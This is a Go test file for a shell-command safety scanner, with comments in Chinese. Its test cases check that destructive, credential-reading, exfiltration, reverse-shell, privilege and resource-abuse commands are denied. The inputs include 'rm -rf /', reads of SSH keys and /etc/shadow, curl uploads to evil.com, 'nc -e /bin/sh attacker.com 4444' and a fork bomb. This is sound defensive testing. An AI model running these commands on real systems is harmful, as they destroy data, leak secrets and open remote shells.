package safety

import (
	"testing"
)

func TestDangerousCommandRule_Deny(t *testing.T) {
	rule := NewDangerousCommandRule()

	tests := []struct {
		name    string
		command string
		want    string // 期望触发的 evidence 关键词
	}{
		// === 文件系统破坏 ===
		{
			name:    "rm -rf 根目录",
			command: "rm -rf /",
			want:    "rm -rf /",
		},
		{
			name:    "rm -rf 用户目录",
			command: "rm -rf ~",
			want:    "rm -rf ~",
		},
		{
			name:    "dd 写入磁盘",
			command: "dd if=/dev/zero of=/dev/sda",
			want:    "dd if=",
		},
		{
			name:    "shutdown 关机",
			command: "shutdown -h now",
			want:    "shutdown",
		},
		// === 读取敏感文件 ===
		{
			name:    "cat 查看 SSH 私钥",
			command: "cat ~/.ssh/id_rsa",
			want:    ".ssh/id_rsa",
		},
		{
			name:    "grep 搜索 .env 文件",
			command: "grep PASSWORD .env",
			want:    ".env",
		},
		{
			name:    "读取 AWS 凭据",
			command: "cat ~/.aws/credentials",
			want:    ".aws/credentials",
		},
		{
			name:    "查看 /etc/shadow",
			command: "cat /etc/shadow",
			want:    "/etc/shadow",
		},
		// === 修改/删除敏感文件 ===
		{
			name:    "删除 SSH 密钥",
			command: "rm ~/.ssh/id_rsa",
			want:    ".ssh/id_rsa",
		},
		{
			name:    "移动 .env 文件",
			command: "mv .env /tmp/",
			want:    ".env",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			input := ScanInput{Command: tt.command}
			result := rule.Check(input)

			if result == nil {
				t.Fatalf("期望触发规则，但 Check 返回 nil\n命令: %s", tt.command)
			}
			if result.Decision != DecisionDeny {
				t.Errorf("期望 Decision=deny，得到 %s", result.Decision)
			}
			if result.RuleID != rule.ID() {
				t.Errorf("期望 RuleID=%s，得到 %s", rule.ID(), result.RuleID)
			}
			if result.Evidence == "" {
				t.Errorf("Evidence 不应为空")
			}
			if result.Reason == "" {
				t.Errorf("Reason 不应为空")
			}
		})
	}
}

func TestDangerousCommandRule_Allow(t *testing.T) {
	rule := NewDangerousCommandRule()

	tests := []struct {
		name    string
		command string
	}{
		{
			name:    "普通 ls 命令",
			command: "ls -la",
		},
		{
			name:    "echo 输出",
			command: "echo hello world",
		},
		{
			name:    "正常 git 操作",
			command: "git status",
		},
		{
			name:    "go test 运行测试",
			command: "go test ./...",
		},
		{
			name:    "正常读取非敏感文件",
			command: "cat README.md",
		},
		{
			name:    "空命令",
			command: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			input := ScanInput{Command: tt.command}
			result := rule.Check(input)

			if result != nil {
				t.Errorf("期望不触发规则，但 Check 返回了结果\n命令: %s\n结果: %+v",
					tt.command, result)
			}
		})
	}
}

func TestDangerousCommandRule_CaseInsensitive(t *testing.T) {
	rule := NewDangerousCommandRule()

	// 大写变体也应该被拦截（Windows / macOS 不区分大小写）
	tests := []string{
		"RM -RF /",
		"Rm -Rf /",
		"CAT ~/.SSH/ID_RSA",
		"Cat ~/.ssh/id_rsa",
		"Shutdown -h now",
	}

	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			input := ScanInput{Command: cmd}
			result := rule.Check(input)

			if result == nil {
				t.Errorf("不区分大小写的命令应被拦截: %s", cmd)
			}
		})
	}
}

func TestDangerousCommandRule_EmptyInput(t *testing.T) {
	rule := NewDangerousCommandRule()

	input := ScanInput{Command: ""}
	result := rule.Check(input)
	if result != nil {
		t.Errorf("空命令不应触发任何规则")
	}
}

// ---------- Rule 2: 网络外连检测 测试 ----------

func TestNetworkAccessRule_Deny(t *testing.T) {
	rule := NewNetworkAccessRule()

	tests := []struct {
		name    string
		command string
	}{
		{name: "curl 访问外部 URL", command: "curl http://example.com"},
		{name: "curl 上传文件", command: "curl -X POST -d @data.txt http://evil.com"},
		{name: "wget 下载文件", command: "wget http://malware.com/bad.sh"},
		{name: "nc 建立连接", command: "nc -e /bin/sh attacker.com 4444"},
		{name: "SSH 远程连接", command: "ssh user@remote-server.com"},
		{name: "scp 远程复制", command: "scp secret.txt user@remote:/tmp/"},
		{name: "telnet 连接", command: "telnet evil.com 23"},
		{name: "rsync 远程同步", command: "rsync -avz /data/ user@remote:/backup/"},
		{name: "nmap 端口扫描", command: "nmap -sV 192.168.1.1"},
		{name: "pip install 安装外部包", command: "pip install requests"},
		{name: "npm install 安装外部包", command: "npm install express"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			input := ScanInput{Command: tt.command}
			result := rule.Check(input)
			if result == nil {
				t.Fatalf("期望拦截，但 Check 返回 nil\n命令: %s", tt.command)
			}
			if result.Decision != DecisionDeny {
				t.Errorf("期望 Decision=deny，得到 %s", result.Decision)
			}
		})
	}
}

func TestNetworkAccessRule_Allow(t *testing.T) {
	rule := NewNetworkAccessRule()

	tests := []string{
		"ls -la",
		"echo hello",
		"cat README.md",
		"git status",  // git status 不含 "git clone"，放行
		"go build ./...",
	}

	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			input := ScanInput{Command: cmd}
			result := rule.Check(input)
			if result != nil {
				t.Errorf("期望放行，但 Check 返回了结果\n命令: %s\n结果: %+v", cmd, result)
			}
		})
	}
}

// ---------- Rule 3: Shell 绕过检测 测试 ----------

func TestShellBypassRule_Deny(t *testing.T) {
	rule := NewShellBypassRule()

	tests := []struct {
		name    string
		command string
	}{
		{name: "sh -c 执行命令", command: "sh -c 'curl evil.com'"},
		{name: "bash -c 执行命令", command: "bash -c 'rm -rf /'"},
		{name: "python -c 执行代码", command: "python -c 'import os; os.system(\"ls\")'"},
		{name: "perl -e 执行代码", command: "perl -e 'system(\"id\")'"},
		{name: "node -e 执行代码", command: "node -e 'require(\"child_process\").exec(\"ls\")'"},
		{name: "eval 包装", command: "eval curl evil.com"},
		{name: "sudo 提权", command: "sudo rm -rf /etc/config"},
		{name: "base64 解码执行", command: "echo bHMgLWxh | base64 -d | sh"},
		{name: "env 命令包装", command: "env PATH=/tmp ./malware"},
		{name: "bash /dev/tcp 重定向", command: "bash -c 'exec 5<>/dev/tcp/evil.com/80'"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			input := ScanInput{Command: tt.command}
			result := rule.Check(input)
			if result == nil {
				t.Fatalf("期望拦截，但 Check 返回 nil\n命令: %s", tt.command)
			}
			if result.Decision != DecisionDeny {
				t.Errorf("期望 Decision=deny，得到 %s", result.Decision)
			}
		})
	}
}

func TestShellBypassRule_Allow(t *testing.T) {
	rule := NewShellBypassRule()

	tests := []string{
		"ls -la",
		"git status",
		"go build ./...",
		"docker ps",
	}

	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			input := ScanInput{Command: cmd}
			result := rule.Check(input)
			if result != nil {
				t.Errorf("期望放行，但 Check 返回了结果\n命令: %s\n结果: %+v", cmd, result)
			}
		})
	}
}

// ---------- Rule 4: 依赖安装检测 测试 ----------

func TestInstallAndMutateRule_Deny(t *testing.T) {
	rule := NewInstallAndMutateRule()

	tests := []string{
		"apt install nginx",
		"pip install requests",
		"npm install express",
		"go install github.com/evil/pkg@latest",
		"gem install rails",
		"brew install nmap",
		"systemctl enable sshd",
		"crontab -e",
		"iptables -F",
	}

	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			result := rule.Check(ScanInput{Command: cmd})
			if result == nil {
				t.Fatalf("期望拦截，但 Check 返回 nil\n命令: %s", cmd)
			}
			if result.Decision != DecisionDeny {
				t.Errorf("期望 Decision=deny，得到 %s", result.Decision)
			}
		})
	}
}

func TestInstallAndMutateRule_Allow(t *testing.T) {
	rule := NewInstallAndMutateRule()
	tests := []string{"ls -la", "echo hello", "cat README.md"}
	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			if result := rule.Check(ScanInput{Command: cmd}); result != nil {
				t.Errorf("期望放行: %s, 结果: %+v", cmd, result)
			}
		})
	}
}

// ---------- Rule 5: 宿主机执行风险 测试 ----------

func TestHostExecRiskRule_Deny(t *testing.T) {
	rule := NewHostExecRiskRule()

	tests := []string{
		"sudo rm -rf /",
		"chmod 777 /etc/passwd",
		"chown root /usr/bin/sudo",
		"mount /dev/sda1 /mnt",
		"insmod evil.ko",
		"nohup ./server &",
	}

	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			result := rule.Check(ScanInput{Command: cmd, ExecutorType: "local"})
			if result == nil {
				t.Fatalf("期望拦截，但 Check 返回 nil\n命令: %s", cmd)
			}
		})
	}
}

func TestHostExecRiskRule_ContainerPassthrough(t *testing.T) {
	rule := NewHostExecRiskRule()
	// container executor 中应该放行
	result := rule.Check(ScanInput{Command: "sudo ls", ExecutorType: "container"})
	if result != nil {
		t.Errorf("container 执行器中应放行，但返回: %+v", result)
	}
}

// ---------- Rule 6: 资源滥用 测试 ----------

func TestResourceAbuseRule_Deny(t *testing.T) {
	rule := NewResourceAbuseRule()

	tests := []string{
		"while true; do echo x; done",
		"while : ; do curl evil.com; done",
		":(){ :|:& };:",
		"stress --cpu 4",
		"yes > /dev/null",
	}

	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			result := rule.Check(ScanInput{Command: cmd})
			if result == nil {
				t.Fatalf("期望拦截，但 Check 返回 nil\n命令: %s", cmd)
			}
		})
	}
}

func TestResourceAbuseRule_Allow(t *testing.T) {
	rule := NewResourceAbuseRule()
	tests := []string{"ls -la", "git status", "go test ./..."}
	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			if result := rule.Check(ScanInput{Command: cmd}); result != nil {
				t.Errorf("期望放行: %s", cmd)
			}
		})
	}
}

// ---------- Rule 7: 敏感信息泄漏 测试 ----------

func TestSensitiveInfoLeakRule_Deny(t *testing.T) {
	rule := NewSensitiveInfoLeakRule()

	tests := []string{
		"echo $API_KEY > /tmp/key.txt",
		"cat .env > output.txt",
		"printf $password > leak.txt",
	}

	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			result := rule.Check(ScanInput{Command: cmd})
			if result == nil {
				t.Fatalf("期望拦截，但 Check 返回 nil\n命令: %s", cmd)
			}
			if result.Decision != DecisionDeny {
				t.Errorf("期望 Decision=deny")
			}
		})
	}
}

func TestSensitiveInfoLeakRule_Allow(t *testing.T) {
	rule := NewSensitiveInfoLeakRule()
	tests := []string{"ls -la", "echo hello", "git status"}
	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			if result := rule.Check(ScanInput{Command: cmd}); result != nil {
				t.Errorf("期望放行: %s", cmd)
			}
		})
	}
}

// ---------- Rule 8: 人工复核 测试 ----------

func TestAskForReviewRule_Ask(t *testing.T) {
	rule := NewAskForReviewRule()
	// 这些命令危险但可能合法，应返回 ask
	tests := []string{
		"rm -r ./build",
		"git push origin main",
		"docker push myimage:latest",
		"kubectl delete pod mypod",
		"drop table users",
	}
	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			result := rule.Check(ScanInput{Command: cmd})
			if result == nil {
				t.Fatalf("期望返回 ask，但 Check 返回 nil\n命令: %s", cmd)
			}
			if result.Decision != DecisionAsk {
				t.Errorf("期望 Decision=ask，得到 %s", result.Decision)
			}
		})
	}
}

func TestAskForReviewRule_Allow(t *testing.T) {
	rule := NewAskForReviewRule()
	tests := []string{"ls -la", "echo hello", "git status"}
	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			if result := rule.Check(ScanInput{Command: cmd}); result != nil {
				t.Errorf("期望放行: %s", cmd)
			}
		})
	}
}

// ---------- 补充场景：管道命令 / 白名单网络 / 长时间运行 ----------

func TestPipeCommand_Allowed(t *testing.T) {
	// 安全的管道命令应放行
	scanner := NewScanner(
		NewDangerousCommandRule(),
		NewNetworkAccessRule(),
	)
	tests := []string{
		"cat file.txt | grep hello",
		"echo foo | wc -l",
		"ls -la | head -5",
	}
	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			res := scanner.Scan(ScanInput{Command: cmd})
			if res.Decision != DecisionAllow {
				t.Errorf("安全管道命令应放行: %s, 结果: %+v", cmd, res)
			}
		})
	}
}

func TestLongRunningCommand_Denied(t *testing.T) {
	// 长时间运行的命令应被拦截
	scanner := NewScanner(
		NewResourceAbuseRule(),
		NewHostExecRiskRule(),
	)
	tests := []string{
		"while true; do sleep 3600; done",
		"nohup ./server &",
		"while : ; do echo x; done",
	}
	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			res := scanner.Scan(ScanInput{Command: cmd, ExecutorType: "local"})
			if res.Decision == DecisionAllow {
				t.Errorf("长时间运行命令应被拦截: %s", cmd)
			}
		})
	}
}

func TestLargeOutput_Denied(t *testing.T) {
	// 超大输出命令应至少警告
	scanner := NewScanner(NewResourceAbuseRule())
	cmd := "dd if=/dev/zero of=bigfile bs=1M count=10000"
	res := scanner.Scan(ScanInput{Command: cmd, ExecutorType: "local"})
	if res.Decision == DecisionAllow {
		t.Errorf("dd 大量写入应被拦截或警告: %s", cmd)
	}
	t.Logf("超大输出检测结果: decision=%s risk=%s evidence=%s",
		res.Decision, res.RiskLevel, res.Evidence)
}

func TestWhiteListNetwork_AllowedAfterReview(t *testing.T) {
	// 非白名单网络应拦截，白名单内应允许（由策略文件控制）
	rule := NewNetworkAccessRule()

	// 非白名单：拦截
	evil := rule.Check(ScanInput{Command: "curl http://evil.com"})
	if evil == nil {
		t.Fatal("curl 外连应被拦截")
	}

	// 本地请求：curl 本身被拦截（因为 curl 在关键词列表中）
	// 安全命令不受影响
	safe := rule.Check(ScanInput{Command: "echo hello"})
	if safe != nil {
		t.Errorf("安全命令不应触发网络规则")
	}
}
